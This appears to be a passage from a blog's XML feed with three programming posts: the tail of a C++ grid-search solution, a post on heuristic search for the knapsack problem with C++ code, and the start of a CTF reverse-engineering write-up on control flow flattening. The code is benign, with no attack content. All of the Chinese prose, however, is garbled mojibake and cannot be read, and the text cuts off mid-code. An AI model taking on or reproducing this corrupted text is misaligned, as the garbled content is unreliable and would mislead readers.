ans=<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line">        cin&gt;&gt;s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">5</span>;j++)&#123;</span><br><span class="line">            <span class="built_in"><span class="keyword">switch</span></span>(s[j])&#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                    ;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=s[j]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">                    qipan[i][j]=<span class="number">2</span>;</span><br><span class="line">                    start_x=j;</span><br><span class="line">                    start_y=i;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    ;</span><br><span class="line">                    <span class="built_in">perror</span>(<span class="string">&quot;input error&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">search</span>(start_x,start_y,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(ans==<span class="number">0x7fffffff</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)&#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½åƒä¸å¼€æ°§æ°”ä¼˜åŒ–ä¼šè¢«å¡æ‰ï¼Œæˆ‘åªèƒ½%æ°§æ°”ä¼˜åŒ–äº†ï¼Œå› ä¸ºæˆ‘å®åœ¨ä¸çŸ¥é“å’‹ä¼˜åŒ–äº†ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> search </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯å‘å¼æœç´¢ç®—æ³•</title>
      <link href="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/"/>
      <url>/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>æ¥å¿«ä¹å­¦ç®—æ³•äº†ã€‚</p><span id="more"></span><h2 id="å¯å‘å¼æœç´¢"><a href="#å¯å‘å¼æœç´¢" class="headerlink" title="å¯å‘å¼æœç´¢"></a>å¯å‘å¼æœç´¢</h2><p>å¯å‘å¼æœç´¢ï¼ˆè‹±æ–‡ï¼šheuristic searchï¼‰æ˜¯ä¸€ç§æ”¹è¿›çš„æœç´¢ç®—æ³•ã€‚å®ƒåœ¨æ™®é€šæœç´¢ç®—æ³•çš„åŸºç¡€ä¸Šå¼•å…¥äº†å¯å‘å¼å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯åŸºäºå·²æœ‰çš„ä¿¡æ¯å¯¹æœç´¢çš„æ¯ä¸€ä¸ªåˆ†æ”¯é€‰æ‹©éƒ½åšä¼°ä»·ï¼Œè¿›è€Œé€‰æ‹©åˆ†æ”¯ã€‚ç®€å•æ¥è¯´ï¼Œå¯å‘å¼æœç´¢å°±æ˜¯å¯¹å–å’Œä¸å–éƒ½åšåˆ†æï¼Œä»ä¸­é€‰å–æ›´ä¼˜è§£æˆ–åˆ å»æ— æ•ˆè§£ã€‚</p><p>åœ¨æ­¤ä¹‹å‰ï¼Œæœ¬è’Ÿè’»ä¸€ç›´å°±åªä¼šdfså’Œbfsï¼Œä»Šå¤©æ¥å­¦å­¦æ–°çš„æœç´¢ç®—æ³•ã€‚ç»è¿‡å¤šé‡èµ„æ–™çš„ æŸ¥é˜…ä¹Ÿæ˜¯å¤§æ¦‚å¾—çŸ¥å¯å‘å¼æœç´¢çš„å¤§æ¦‚æ€è·¯ï¼Œæ¯æ¬¡æœç´¢ä¼šå¯¹ä¹‹åå¯èƒ½çš„æœ€ä¼˜çŠ¶æ€ä¼°å€¼ï¼Œå¦‚æœä¼°å‡ºæ¥çš„å€¼ä¸å¦‚å½“å‰æŸäº›çŠ¶æ€ï¼Œé‚£ä¹ˆæˆ‘å°±ç›´æ¥èˆå¼ƒè¿™ä¸ªçŠ¶æ€ã€‚å°±æ¯”å¦‚ç»å…¸01èƒŒåŒ…é—®é¢˜ï¼Œæˆ‘å¯¹æ¯ä¸€ä¸ªç‰©å“çš„æŠ‰æ‹©éƒ½æœ‰é€‰æˆ–è€…ä¸é€‰ä¸¤ç§é€‰æ‹©ï¼Œæˆ‘å‘ç°æˆ‘ä¸é€‰è¿™ä¸ªç‰©å“ï¼Œé€‰å…¶å®ƒç‰©å“æ‰€äº§ç”Ÿçš„æœ€ä¼˜è§£ä¸å¦‚æˆ‘å½“å‰é€‰è¿™ä¸ªè§£çš„çŠ¶æ€å¥½ï¼Œé‚£ä¹ˆæˆ‘ç›´æ¥è€ƒè™‘é€‰æ‹©è¿™ä¸ªè€Œä¸å»æœç´¢ä¸é€‰æ‹©è¿™ä¸ªç‰©å“çš„çŠ¶æ€ã€‚</p><h3 id="ä¼°å€¼å‡½æ•°"><a href="#ä¼°å€¼å‡½æ•°" class="headerlink" title="ä¼°å€¼å‡½æ•°"></a>ä¼°å€¼å‡½æ•°</h3><p>è¿™é‡Œéœ€è¦è§£é‡Šä¸€ä¸‹æˆ‘å¦‚ä½•åˆ¤æ–­å½“å‰çŠ¶æ€æ˜¯å¦ä¼˜äºä¹‹åçš„æœ€ä¼˜çŠ¶æ€ï¼Œé‚£ä¹ˆè¿™é‡Œéœ€è¦è¿™ä¹ˆä¸€ä¸ªä¼°å€¼å‡½æ•°ï¼Œä¼°å€¼å‡½æ•°ä¸æ˜¯çœŸçš„å¯¹é‚£ä¸ªæƒ…å†µåšå…·ä½“åˆ†æï¼Œé‚£æ ·çš„è¯è·Ÿæš´åŠ›æ²¡åŒºåˆ«äº†ã€‚æˆ‘è¿™æ ·è€ƒè™‘ï¼Œå¦‚æœå‰©ä¸‹æ‰€æœ‰ç‰©å“å…¨èƒ½æ”¾è¿›å»éƒ½ä¸å¦‚æˆ‘ä¸€ä¸ªæ”¾è¿›å»ä»·å€¼å¤§ï¼Œé‚£ä¹ˆæˆ‘è‚¯å®šå¾—æ”¾è¿™ä¸ªç‰©å“(å‰ææ˜¯æ”¾å¾—è¿›å»ï¼Œæ”¾ä¸è¿›å»å°±åˆ«è®¨è®ºäº†)ã€‚é‚£ä¹ˆè¿™ä¸ªå‰©ä¸‹çš„æ‰€æœ‰ç‰©å“çš„ä»·å€¼å°±æ˜¯æˆ‘è¿™ä¸€ä¸ªå¯å‘å¼æœç´¢æ–¹æ¡ˆçš„ä¼°å€¼å‡½æ•°ã€‚</p><p>å‡å¦‚æœ‰næ ·ç‰©å“ï¼Œé‚£ä¹ˆåœ¨æœç´¢ç¬¬xæ ·ç‰©å“çš„ä¼°å€¼å‡½æ•°å°±æ˜¯</p><p>$f(x)=\sum _{i=x} ^{n} a[i]$</p><p>æˆ‘åœ¨åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªè¦ä¸è¦æ”¾çš„æ—¶å€™æˆ‘åªéœ€è¦çœ‹çœ‹æˆ‘å†å²æœ€ä¼˜å€¼æ˜¯å¦å°äºå½“å‰æœ€ä¼˜å€¼+ä¼°å€¼å‡½æ•°å€¼å°±å¯ä»¥äº†ï¼Œå¦‚æœæˆç«‹é‚£å°±è¯´æ˜è¿™ä¸ªå¯èƒ½å¯ä»¥ä¸æ”¾ï¼Œå¦åˆ™è¿™ä¸ªå¿…é¡»è¦æ”¾ï¼Œå› ä¸ºå¦‚æœä¸æ”¾çš„è¯ï¼Œå®ƒå‰©ä¸‹å°±ç®—å…¨æ”¾éƒ½æ²¡æœ‰æˆ‘å†å²æœç´¢å‡ºæ¥çš„æœ€ä¼˜å€¼å¤§ï¼Œé‚£ä¹ˆæˆ‘å°±æ²¡å¿…è¦æœç´¢ä¸æ”¾çš„æƒ…å†µäº†ã€‚å½“ç„¶è¿™æ˜¯å…¶ä¸­ä¸€ç§å¯å‘å¼æœç´¢çš„åŠæ³•ã€‚è¿˜æœ‰å…¶å®ƒçš„æ–¹å¼ï¼Œæˆ‘ä»¬ä¸‹é¢è®²ã€‚</p><h2 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h2><p>æ¥è‡ªæ´›è°·<a href="https://www.luogu.com.cn/problem/P1048">P1048 NOIP2005 æ™®åŠç»„ é‡‡è¯</a></p><p>é‚£ä¹ˆæˆ‘æŒ‰ç…§æˆ‘ä¹‹å‰çš„å¯å‘å¼æœç´¢æ–¹å¼å¾—åˆ°äº†ä¸‹é¢çš„ç®—æ³•ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">int</span> v[maxn],c[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=v[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=c[now])</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-c[now],value+v[now]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;c[i],&amp;v[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç®—å‡ºæ­£ç¡®ç»“æœï¼Œä½†æ˜¯æœ‰äº›ç‚¹ä¼šT</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/1.png" alt="1"></p><p>äº‹å®ä¸Šæˆ‘è¿™æ ·çš„å¯å‘å¼æœç´¢æ–¹æ³•è¿˜æ˜¯æœ‰ç‚¹æš´åŠ›ï¼Œå› ä¸ºåé¢çš„ç‰©å“å¯èƒ½å®Œå…¨ä¸€ä¸ªéƒ½æ”¾ä¸è¿›å»ï¼Œä½†æ˜¯ä»·å€¼å¾ˆå¤§ï¼Œè¿™æ ·çš„æ•°æ®å¯å‘å¼æœç´¢å°±ä¼šé€€åŒ–æˆæœ´ç´ ç®—æ³•ã€‚</p><p>é‚£ä¹ˆæˆ‘å¦‚æœæ¢ä¸€ç§ï¼Œæˆ‘ä¸ç®¡ä»€ä¹ˆå°±ä¸€ä¸ªä¸ªæ”¾è¿›å»çœ‹çœ‹èƒ½æœ‰å¤šå°‘æœ€å¤§çš„ä»·å€¼ï¼Œä¸ºäº†ä¿è¯èƒ½æœ´ç´ åœ°ç®—å‡ºæœ€å¤§å€¼æˆ‘ä»¬å¯ä»¥å…ˆå¯¹ç‰©å“çš„å•ä½ä»·å€¼æ’åºç„¶åä¸€ä¸ªä¸ªæ”¾ï¼Œè€Œä¸”æˆ‘ä»¬éœ€è¦å‡è®¾ç‰©å“å¯ä»¥åˆ†å‰²ã€‚é‚£ä¸ç„¶çš„è¯ç­‰äºæ˜¯åœ¨åé¢çš„ç‰©å“åšä¸€æ¬¡åŠ¨æ€è§„åˆ’ï¼Œå¤æ‚åº¦è¿˜æ˜¯æ¯”è¾ƒé«˜çš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¾—å‡ºä¼°å€¼å‡½æ•°ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;c[i])&#123;</span><br><span class="line">            ans+=v[i];</span><br><span class="line">            res-=c[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+d[i]*res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åå†™å‡ºä»¥ä¸‹çš„ä»£ç :</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 10001</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">item</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> c,v;</span><br><span class="line">    <span class="keyword">double</span> d;</span><br><span class="line">&#125;a[maxn];</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> res)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(res&gt;a[i].c)&#123;</span><br><span class="line">            ans+=a[i].v;</span><br><span class="line">            res-=a[i].c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> ans+(<span class="keyword">int</span>)(a[i].d*res);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> contain,<span class="keyword">int</span> value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(value&gt;ans)ans=value;</span><br><span class="line">    <span class="keyword">if</span>(now&gt;n)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(contain&gt;=a[now].c)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain-a[now].c,value+a[now].v);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">f</span>(now,contain)+value&gt;ans)</span><br><span class="line">        <span class="built_in">search</span>(now+<span class="number">1</span>,contain,value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>&lt;(<span class="keyword">const</span> item &amp;a, <span class="keyword">const</span> item &amp;b)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> a.d &gt; b.d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">int cmp(item a,item b)&#123;</span></span><br><span class="line"><span class="comment">    if(a.d&lt;b.d)return 0;</span></span><br><span class="line"><span class="comment">    return 1;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a[i].c,&amp;a[i].v);</span><br><span class="line">        a[i].d=(<span class="keyword">double</span>)a[i].v/a[i].c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(a+<span class="number">1</span>,a+<span class="number">1</span>+n);</span><br><span class="line">    <span class="built_in">search</span>(<span class="number">1</span>,m,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸACã€‚</p><p><img src="/2021/12/15/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95/2.png" alt="2"></p><p>ç”±æ­¤å¯è§ï¼Œåªè¦æˆ‘ä»¬é€‰çš„ä¼°å€¼å‡½æ•°å¤Ÿå¥½ï¼Œé‚£ä¹ˆæœç´¢å®ƒå°±ä¸ä¼šé‚£ä¹ˆæš´åŠ›äº†ï¼Œè¿™å¤§æ¦‚ä¹Ÿæ˜¯å¯å‘å¼æœç´¢ç®—æ³•çš„ç²¾é«“ï¼Œåªè¦ä¼°å€¼å‡½æ•°é€‰çš„å¥½ï¼Œå¤æ‚åº¦èƒ½ç›´æ¥ä»æŒ‡æ•°çº§é™åˆ°(å…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯å¤šå°‘hhh)ï¼Œä½†æ˜¯ä¸ªäººè§‰å¾—ï¼Œåªè¦ä¼°å€¼å‡½æ•°å†™å‡ºæ¥äº†ï¼Œéƒ½æ˜¯æ²¡é—®é¢˜çš„ï¼Œå› ä¸ºä»£ç é‡æœ¬èº«å°±å¾ˆå°‘ï¼Œåªæ˜¯åœ¨åšå†³ç­–ä¹‹å‰ä¼°è®¡ä»¥ä¸‹è¿™ä¸€æ­¥åˆ°åº•å€¼ä¸å€¼å¾—å°±å¥½äº†ï¼Œç„¶åå°±æ˜¯é€’å½’å¤§æ³•å¥½ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘çš„searchå‡½æ•°æœ¬èº«å°±è¿™å‡ å¥ã€‚</p><p>é‚£ä¹ˆåœ¨è¿™æ ·çš„æœç´¢é‡Œé¢å¯å‘å¼ç®—æ³•çš„ä¼°å€¼å‡½æ•°å¾ˆå®¹æ˜“æ±‚ï¼Œä½†æ˜¯å¦‚æœæ˜¯è¿·å®«ç±»çš„é—®é¢˜ï¼Œå¯å‘å¼ç®—æ³•è¿˜çœŸçš„å°±éš¾è¯´äº†ï¼Œç­‰æ˜å¤©å»çœ‹çœ‹è¿·å®«ç±»çš„å¯å‘å¼æœç´¢å§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> algorithm </category>
          
          <category> search </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF2019 polyre writeup writeup</title>
      <link href="/2021/12/15/%5BRoarCTF2019%5Dpolyre%20writeup/"/>
      <url>/2021/12/15/%5BRoarCTF2019%5Dpolyre%20writeup/</url>
      
        <content type="html"><![CDATA[<p>buuåˆ·é¢˜è®°å½•-<a href="https://buuoj.cn/challenges#[RoarCTF2019]polyre">RoarCTF2019 polyre</a></p><span id="more"></span><h2 id="åˆæ­¥åˆ†æ"><a href="#åˆæ­¥åˆ†æ" class="headerlink" title="åˆæ­¥åˆ†æ"></a>åˆæ­¥åˆ†æ</h2><p>æ‹¿åˆ°æ–‡ä»¶idaæ‰“å¼€ï¼Œå‘ç°æ˜¯å¾ˆç»æœ›çš„ç©¶ææ— æ•Œçš„ä»£ç æ··æ·†â€”â€”æ§åˆ¶æµå¹³å¦åŒ–ã€‚</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/1.png" alt="1"></p><h3 id="æ§åˆ¶æµå¹³å¦åŒ–ä»‹ç»"><a href="#æ§åˆ¶æµå¹³å¦åŒ–ä»‹ç»" class="headerlink" title="æ§åˆ¶æµå¹³å¦åŒ–ä»‹ç»"></a>æ§åˆ¶æµå¹³å¦åŒ–ä»‹ç»</h3><p>æ§åˆ¶æµå¹³å¦åŒ–(control flow flattening)çš„åŸºæœ¬æ€æƒ³ä¸»è¦æ˜¯é€šè¿‡ä¸€ä¸ªä¸»åˆ†å‘å™¨æ¥æ§åˆ¶ç¨‹åºåŸºæœ¬å—çš„æ‰§è¡Œæµç¨‹ï¼Œä¾‹å¦‚ä¸‹å›¾æ˜¯æ­£å¸¸çš„æ‰§è¡Œæµç¨‹ </p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/2.png" alt="2"></p><p>åœ¨ç»è¿‡æ§åˆ¶æµå¹³å°åŒ–çš„æ··æ·†ä¹‹åï¼Œä¼šå˜æˆå¦‚ä¸‹çš„ç»“æ„</p><p><img src="/2021/12/15/[RoarCTF2019]polyre%20writeup/3.png" alt="3"></p><p>æµç¨‹å›¾çœ‹èµ·æ¥å°±åƒæ˜¯åŒä¸€çº§çš„å…³ç³»ï¼Œå—ä¹‹é—´å¤±å»äº†å±‚æ¬¡åˆ†æ˜ï¼Œé€»è¾‘å¯è¯»æ€§å˜å¾—æ›´å·®ã€‚</p><p>å°±å¥½æ¯”æˆ‘ä»¬å¹³æ—¶åšçš„å †èœå•é¢˜ï¼Œé€‰æ‹©èœå•çš„æ—¶å€™ï¼Œé€»è¾‘åŸºæœ¬å°±æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">int</span> num=getnum();</span><br><span class="line">    <span class="keyword">switch</span>(num)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            add();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            edit();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">delete</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            show();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            error_choice();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ‰æ—¶å€™ç»è¿‡idaåç¼–è¯‘å¹¶ä¸æ˜¯é‚£ä¹ˆæ¸…æ™°çš„ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“å®ƒæ˜¯ä¸æ˜¯ç‰¹æ„åŠ äº†æ··æ·†è¿˜æ˜¯idaæœ¬èº«çš„é—®é¢˜ï¼Œåç¼–è¯‘ä»£ç å˜æˆäº†ä¸‹é¢çš„æƒ…å†µ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                    menu();</span><br><span class="line">                    <span 